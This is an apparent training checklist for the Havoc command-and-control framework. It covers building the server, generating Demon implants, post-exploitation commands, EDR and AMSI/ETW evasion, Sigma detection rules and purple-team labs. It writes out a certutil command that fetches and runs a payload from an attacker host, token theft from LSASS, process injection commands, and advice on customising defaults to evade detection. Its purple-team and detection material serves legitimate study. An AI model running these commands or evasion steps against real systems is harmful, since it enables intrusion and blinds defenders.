# ⚔️ Havoc: Complete Mastery Checklist

> **What is Havoc?** Havoc is a modern, open-source Command & Control (C2) framework written in Go (server) and C/C++ (the "Demon" implant). It provides a Qt-based graphical interface, a modular agent architecture, and a focus on offensive tradecraft and EDR evasion techniques. Havoc's Demon agent implements advanced in-memory evasion techniques: indirect syscalls, sleep obfuscation, module stomping, process injection, and AMSI/ETW bypass — making it one of the most technically sophisticated publicly-available C2 frameworks.
>
> **Why does it exist?** Cobalt Strike is expensive and heavily signatured. Sliver and Metasploit are well-known and detected. Havoc was created as a technically advanced, free alternative that implements modern EDR evasion techniques used by real APT groups. Its focus on low-level Windows evasion makes it particularly valuable for learning advanced offensive tradecraft and testing EDR detection capabilities.
>
> **When to use it:** Advanced red team operations requiring EDR evasion, testing blue team detection capabilities against sophisticated implants, learning advanced Windows offensive techniques (direct/indirect syscalls, AMSI bypass, memory evasion), and Phase 10 purple team exercises.
>
> **When to avoid it:** Havoc's advanced evasion techniques are overkill for basic assessments. Use Metasploit or Sliver for simpler engagements. Havoc requires deeper understanding of Windows internals to use effectively. Only use in fully authorized engagements.
>
> **What mastering Havoc unlocks:** Advanced EDR evasion technique understanding, Windows offensive tradecraft at the API/syscall level, ability to test and improve blue team detection capabilities, and Phase 10 advanced red team proficiency.
>
> **Roadmap Phase:** Phase 10 — Advanced Red Team & Purple Team (Advanced C2 & EDR Evasion)

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](README.md)

| C2 Frameworks | EDR Evasion | Post-Exploitation |
|:-------------|:-----------|:-----------------|
| [🏰 Mythic](Mythic.md) | **⚔️ Havoc** (you are here) | [🔱 Sliver](Sliver.md) |
| | [💉 Metasploit](Metasploit_Framework.md) | [🔧 Impacket](Impacket.md) |

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Installation & Setup | 6 | 2–3 hours |
| 2 | UI & Listener Configuration | 5 | 2–3 hours |
| 3 | Demon Agent — Generation & Callbacks | 6 | 3–4 hours |
| 4 | Post-Exploitation & Built-in Modules | 8 | 4–5 hours |
| 5 | EDR Evasion Techniques | 9 | 5–7 hours |
| 6 | Purple Team — Testing Detections | 5 | 3–4 hours |
| 7 | Practical Labs | 4 | 5–8 hours |
| | **Total** | **43** | **~24–34 hours** |

**Prerequisites:** Phase 7 complete (binary exploitation basics, Windows internals). Phase 10 Mythic basics (C2 concepts). Windows API knowledge (system calls, process injection concepts). Linux server for Havoc server deployment.

---

# PHASE 1: INSTALLATION & SETUP

---

## 1.1 Server Installation (Linux)

```bash
# Prerequisites
sudo apt install golang-go gcc g++ cmake make libssl-dev pkg-config

# Clone Havoc
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Build the Havoc teamserver (C2 server)
cd teamserver
go mod download && go build -o havoc-server cmd/teamserver/main.go

# Build the Havoc client (Qt UI) — requires Qt5 dependencies
sudo apt install qt5-qmake qt5-default libqt5websockets5-dev
cd ../client
mkdir build && cd build
cmake ..
make -j$(nproc)

# Alternatively: download pre-built releases from GitHub Releases
```

## 1.2 Starting the Team Server

```bash
# Create a profile file (defines server settings)
cat > havoc_profile.yaotl << 'EOF'
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "x86_64-w64-mingw32-gcc"
        Compiler86 = "i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "operator" {
        Password = "securepassword123"
    }
}
EOF

# Start the teamserver
sudo ./havoc-server server --profile havoc_profile.yaotl

# Start the client (UI) on a separate machine or the same server
./havoc-client connect --host <server-ip> --port 40056
```

## 1.3 Required Cross-Compiler Setup

```bash
# Havoc builds Windows agents on Linux using mingw-w64
sudo apt install mingw-w64 nasm

# Verify
x86_64-w64-mingw32-gcc --version
i686-w64-mingw32-gcc --version
nasm --version
```

---

# PHASE 2: UI & LISTENER CONFIGURATION

---

## 2.1 Creating an HTTP/HTTPS Listener

```
Havoc UI → View → Listeners → New Listener

Configuration:
- Name: MyHTTPSListener
- Protocol: Https
- Host: your.domain.com (or IP for lab use)
- Port: 443
- Secure: Yes (HTTPS)
- Certificate: Use certbot (Let's Encrypt) or self-signed for lab
- UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
- Header:
    Accept: text/html,application/xhtml+xml,application/xml
    Accept-Language: en-US,en;q=0.9
- Uris: ["/index.php", "/jquery.min.js", "/assets/login.js"]  # Blend in as web traffic
- WorkingHours: 0-0 (all hours, or set business hours for realism)
- HostBind: 0.0.0.0
```

## 2.2 Creating a SMB Listener (Lateral Movement)

```
Listener Type: SMB
- Name: SMBPipe
- PipeName: \\.\pipe\MicrosoftUpdate    # Named pipe (disguised as legitimate)
- Kill Date: 2024-12-31                  # Hard-coded expiry
```

---

# PHASE 3: DEMON AGENT — GENERATION & CALLBACKS

---

## 3.1 Generating a Demon Payload

```
Havoc UI → Attack → Payload → Generate

Key Configuration Options:
- Listener: Select your HTTP/HTTPS listener
- Output Format:
    exe                  — Windows executable (most detectable)
    dll                  — DLL (for sideloading or reflective loading)
    raw shellcode        — Position-independent shellcode (for injection)
    service executable   — For persistence via Windows Service
    
- Sleep Technique:
    WaitForSingleObject  — Simple sleep (baseline, detectable)
    Ekko                 — Encrypted sleep with ROP chain (EDR evasion)
    Zilean               — Timer-based encrypted sleep
    
- Stack Spoof: On/Off — Spoofs call stack to make Demon appear legitimate
- Sleep Mask: On/Off — Encrypts agent in memory during sleep
- Indirect Syscalls: On/Off — Calls Windows APIs via indirect syscalls (bypasses API hooks)
- AMSI/ETW Bypass: On/Off — Disables Windows Antimalware Scan Interface

Download the payload file
```

## 3.2 Payload Delivery & Callback

```
# Deliver payload to lab Windows VM (for testing):
# Method 1: Python HTTP server
python3 -m http.server 8080 &
# On target: certutil -urlcache -f http://kali-ip:8080/demon.exe demon.exe && demon.exe

# Method 2: SMB share
impacket-smbserver share . -smb2support
# On target: \\kali-ip\share\demon.exe

# Successful callback appears in Havoc UI:
# Callback panel shows:
# ID | External IP | Internal IP | Computer | User | OS | Process | PID | Last Seen

# Right-click the callback → Interact → Opens command terminal for this agent
```

---

# PHASE 4: POST-EXPLOITATION & BUILT-IN MODULES

---

## 4.1 Basic Commands

```
# In the Demon interactive terminal:
help                           # List all commands
shell whoami                   # cmd.exe shell command
powershell Get-Process         # PowerShell execution
ls                             # Directory listing
cd C:\Users                    # Change directory
upload /tmp/nc.exe C:\nc.exe   # Upload file
download C:\Users\victim\file  # Download file
screenshot                     # Capture screenshot
ps                             # Process list
sysinfo                        # System information
env                            # Environment variables
```

## 4.2 Token Manipulation

```
# Token stealing and impersonation:
token steal <PID>              # Steal token from a higher-privileged process
token list                     # List available tokens
token make <user> <pass> <domain>  # Create token for user (runas equivalent)
token revert                   # Revert to original token

# Find SYSTEM processes to steal token from:
ps | grep -i "lsass\|winlogon\|services.exe"
token steal <lsass_pid>        # Steal SYSTEM token from LSASS
```

## 4.3 Process Injection

```
# Inject shellcode into another process:
inject shellcode <pid> <shellcode_file>

# Spawn-and-inject (creates a new suspended process, injects, resumes):
inject spawn /path/to/shellcode.bin

# Reflective DLL injection:
inject dll <pid> /path/to/payload.dll
```

## 4.4 SOCKS5 Proxy & Port Forwarding

```
# Start SOCKS5 proxy for network pivoting
socks5 start 1080

# Route Nmap, BloodHound, etc. through:
# proxychains nmap -sT 10.10.10.0/24 -p 445,389,636

# Reverse port forwarding
rportfwd add <local_port> <target_host> <target_port>
# Example: forward localhost:3389 → internal server's 3389
rportfwd add 3389 10.10.10.1 3389
```

---

# PHASE 5: EDR EVASION TECHNIQUES

---

## 5.1 Understanding What Havoc Evades

```
Modern EDR hooks (Elastic, CrowdStrike, SentinelOne, Carbon Black):
1. UserLand API hooks — EDR places JMP/INT3 at start of NtXxx functions in ntdll.dll
2. Kernel callbacks — ETW (Event Tracing for Windows) process creation/thread events
3. AMSI hooks — AMSI.dll hooks block malicious PowerShell/script execution
4. Stack inspection — EDR inspects call stacks at hook points to verify legitimacy
5. Memory scanning — Periodic scanning of RWX memory regions
6. Beacon detection — Looking for periodic network patterns (C2 check-ins)
```

## 5.2 Direct and Indirect Syscalls

```c
// EDR hooks work in userland (ntdll.dll loaded into process memory)
// Direct syscall: bypass hooks by calling the syscall instruction directly
// instead of going through the hooked ntdll function

// HOOKED (EDR can inspect):
// Application → VirtualAlloc (kernel32.dll) → NtAllocateVirtualMemory (ntdll.dll, HOOKED)
//               → syscall instruction → Kernel

// DIRECT SYSCALL (bypasses EDR hook):
// Application → [our assembly with correct syscall number] → syscall → Kernel
//               (never touches ntdll — hook is bypassed)

// INDIRECT SYSCALL (more sophisticated — Havoc implements this):
// Application → [our code] → ntdll.dll syscall instruction (not the hooked function, but the syscall instruction inside the function, past the hook bytes) → Kernel
```

```
# In Havoc payload generation:
Indirect Syscalls: Enabled
# This uses Havoc's Perun's Fart technique — locates the syscall instruction
# inside ntdll.dll functions (past the EDR's hook bytes) and calls it directly
```

## 5.3 Sleep Obfuscation — Ekko Technique

```
# Problem: While sleeping, the agent's shellcode sits in memory as RWX
# EDR can scan this memory and detect it

# Ekko technique (implemented in Havoc):
# 1. During sleep: use a ROP chain to:
#    a. Set up a timer callback
#    b. XOR-encrypt the agent's memory region
# 2. Sleep for the configured interval (memory is encrypted — undetectable)
# 3. Timer fires: decrypt memory, continue execution

# In payload generation:
Sleep Technique: Ekko
Sleep Mask: Enabled
```

## 5.4 Stack Spoofing

```
# EDR inspects the call stack at API hook points:
# If NtAllocateVirtualMemory is called from a ROP chain (not from a legitimate DLL),
# the call stack looks suspicious — EDR flags it

# Stack spoofing: manipulate the return address stack to appear to come from
# a legitimate DLL (e.g., Microsoft's kernel32.dll)

# In Havoc payload generation:
Stack Spoof: Enabled
# Uses custom return address on the stack that points into legitimate Windows DLLs
```

## 5.5 AMSI/ETW Bypass

```
# AMSI (Antimalware Scan Interface): PowerShell, JScript, VBScript content 
# passes through AMSI before execution — AV engines scan it
# 
# Bypass: Patch amsi.dll's AmsiScanBuffer function in memory to return
# AMSI_RESULT_CLEAN without scanning

# ETW (Event Tracing for Windows): Kernel-level event logging
# Bypass: Patch EtwEventWrite in ntdll.dll to NOP it out

# Havoc automates these patches when AMSI/ETW bypass is enabled in payload config
# Combined with indirect syscalls, patches are applied without touching
# the hooked function entry points (avoiding detection of the patch itself)
```

---

# PHASE 6: PURPLE TEAM — TESTING DETECTIONS

---

## 6.1 Purple Team Methodology with Havoc

```
Purple team = Red team (Havoc) + Blue team (SIEM/EDR) working together

Workflow:
1. Red: Enable each evasion technique progressively
2. Blue: Monitor SIEM/EDR for detection events
3. Document: Which configurations produce detections vs. evade?

Testing matrix:
┌─────────────────────────┬──────────────┬───────────────┐
│ Configuration           │ EDR Detects? │ Detection Rule│
├─────────────────────────┼──────────────┼───────────────┤
│ Baseline (no evasion)   │ Yes          │ ...           │
│ + Indirect Syscalls     │ ?            │ ...           │
│ + Sleep Mask (Ekko)     │ ?            │ ...           │
│ + Stack Spoof           │ ?            │ ...           │
│ + AMSI Bypass           │ ?            │ ...           │
│ All enabled             │ ?            │ ...           │
└─────────────────────────┴──────────────┴───────────────┘
```

## 6.2 Writing Detections for Havoc

```yaml
# Sigma rule to detect Havoc's default User-Agent
title: Havoc C2 Framework Default User-Agent
logsource:
  category: proxy
  product: windows
detection:
  selection:
    cs-user-agent|contains: 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36'
  condition: selection
level: high

# Detect AMSI bypass via memory patching
title: AMSI DLL Memory Patch
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\amsi.dll'
    GrantedAccess: '0x1438'  # PROCESS_VM_WRITE + PROCESS_VM_OPERATION
  filter_legit:
    SourceImage|startswith:
      - 'C:\Windows\System32\'
  condition: selection and not filter_legit
level: critical
```

---

# PHASE 7: PRACTICAL LABS

---

- [ ] **Lab 1 — Havoc Deployment:** Deploy Havoc server on a Linux VM. Build or download the client. Create an HTTPS listener with a realistic HTTP profile (blend-in User-Agent, URI paths). Generate an EXE payload with all default settings (no evasion). Execute in a lab Windows VM. Confirm callback.

- [ ] **Lab 2 — Basic Operations:** In the lab, run a 30-minute post-exploitation session using only built-in Havoc commands. Document: process list, system info, screenshot, token theft, and file download. Practice the command syntax until it's natural.

- [ ] **Lab 3 — EDR Evasion Testing:** Set up Windows Defender on the target VM (or use a trial EDR). Test 4 payload configurations in sequence: (a) No evasion, (b) Indirect syscalls only, (c) Sleep mask (Ekko), (d) All evasion techniques enabled. Record which configurations are detected vs. not. Write detection rules (Sigma/YARA) for any detectable artifacts you observe.

- [ ] **Lab 4 — Purple Team Exercise:** Pair with a "blue team" role (yourself monitoring Splunk/ELK with Sysmon telemetry, or a study partner). Run Havoc with full evasion enabled. The blue team uses your pre-written Sigma rules and Sysmon logs. Report: (a) Which Sigma rules detected Havoc activity? (b) Which failed? (c) What new detections would you write based on what you observed?

---

## 📝 Operational Notes

- **Havoc vs Cobalt Strike:** Cobalt Strike implements Beacon (mature, heavily researched, and heavily signatured). Havoc is newer, less signatured, and technically comparable in evasion capability. Cobalt Strike CS4.9+ has significant improvements; Havoc is the free equivalent with comparable modern evasion.
- **Compilation environment matters:** Havoc's Demon agent is compiled on the team server using MinGW. Compilation artifacts (strings, debug symbols, compiler fingerprints) can fingerprint the agent. Strip binaries and customize string literals before operational use.
- **Sleep time detection:** Even with Ekko sleep obfuscation, periodic network callbacks create temporal patterns detectable by network ML (e.g., Darktrace, Vectra). Increase sleep intervals (5-30 minutes) and add jitter (25-50%) for realistic long-term engagements.
- **GitHub detection:** Havoc's public GitHub repository means security vendors have analyzed its code and created signatures for default values (default pipe names, default User-Agent strings, default sleep constants). Always customize these defaults before operational use.
- **Windows Defender AMSI:** Windows Defender specifically has signatures for Havoc's AMSI bypass pattern. The evasion arms race means public techniques get detected; operational tools need custom implementations. Use Havoc to *learn* the techniques, then understand you'd need custom variants for real engagements against hardened targets.
